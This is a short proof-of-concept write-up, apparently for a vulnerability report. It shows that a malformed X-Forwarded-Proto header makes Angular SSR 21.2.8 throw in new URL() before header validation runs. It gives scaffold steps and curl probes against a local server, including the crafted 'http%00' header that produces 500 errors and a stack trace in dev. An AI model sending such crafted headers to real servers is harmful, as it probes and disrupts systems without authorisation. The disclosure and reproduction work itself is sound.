# PoC — `X-Forwarded-Proto` reaches `new URL()` before validation

Tested on `@angular/ssr@21.2.8` / `@angular/build@21.2.8`, Node 25, darwin/arm64.

## Scaffold

`ng new xfproto-test --ssr` defaults. Post-scaffold changes:

1. `angular.json` — `security.allowedHosts: ["example.com"]`.
2. `src/app/app.routes.server.ts` — `RenderMode.Prerender` → `RenderMode.Server`.
3. `src/app/app.routes.ts` + `src/app/home.component.ts` — minimal `/home` route.
4. `src/server.ts` — remove `isMainModule(...)` gate (macOS `/tmp` symlink friendliness only; unrelated to the bug).

No changes to `targets/angular-cli`. The bug is in the shipped `@angular/ssr@21.2.8` `node_modules` code.

## Install + build

```
npm install
npx ng build
```

## Run

```
PORT=4300 node dist/xfh-comma-leak/server/server.mjs
```

(Output folder name `xfh-comma-leak` is a cosmetic carryover from the reused scaffold project key.)

## Three probes

```
# A. Baseline — happy path
curl -si http://127.0.0.1:4300/home -H 'Host: example.com'
# → 200, home-ok

# B. Exploit — malformed scheme bytes throw from new URL() before validateRequest
curl -si http://127.0.0.1:4300/home -H 'Host: example.com' -H 'X-Forwarded-Proto: http%00'
# → 500 with TypeError stack in dev; 500 generic in prod

# C. Control — validator rejects structurally-valid but disallowed scheme
curl -si http://127.0.0.1:4300/home -H 'Host: example.com' -H 'X-Forwarded-Proto: httpx'
# → 400, 'Header "x-forwarded-proto" must be either "http" or "https".'
```

Evidence capture is in `../evidence/`.

To verify the production-mode behavior:

```
NODE_ENV=production PORT=4304 node dist/xfh-comma-leak/server/server.mjs
curl -si http://127.0.0.1:4304/home -H 'Host: example.com' -H 'X-Forwarded-Proto: http%00'
# → 500 'Internal Server Error' (stack body suppressed, but 500 persists)
```
